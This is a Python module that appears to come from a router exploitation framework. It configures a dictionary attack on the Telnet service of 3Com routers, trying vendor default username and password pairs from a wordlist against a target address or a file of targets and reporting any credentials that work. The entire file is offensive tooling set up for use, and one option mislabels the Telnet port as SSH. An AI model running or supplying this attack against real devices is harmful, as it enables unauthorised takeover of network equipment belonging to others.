from routerxpl.core.exploit import *

# hack to import from directory/filename starting with a number
TelnetDefault = utils.import_exploit("routerxpl.modules.creds.generic.telnet_default")


class Exploit(TelnetDefault):
    __info__ = {
        "name": "3Com Router Default Telnet Creds",
        "description": "Module performs dictionary attack against 3Com Router Telnet service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "3Com Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("file://wordlists/vendors/3com_defaults.txt", "User:Pass or file with default credentials (file://)")
